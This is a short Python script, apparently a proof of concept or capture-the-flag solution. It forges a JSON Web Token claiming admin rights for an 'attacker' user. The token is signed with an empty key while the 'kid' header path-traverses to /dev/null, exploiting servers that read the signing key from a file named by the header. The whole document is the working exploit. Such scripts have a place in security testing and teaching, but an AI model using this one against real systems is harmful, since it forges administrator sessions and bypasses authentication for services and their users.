import jwt, datetime

print(
    jwt.encode({
        'user': "attacker",
        'admin': True,
        'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=30)
    }, "", algorithm="HS256", headers={"kid": "../../../../../../dev/null"})
)

# KID vulnerability to sign JWT with empty key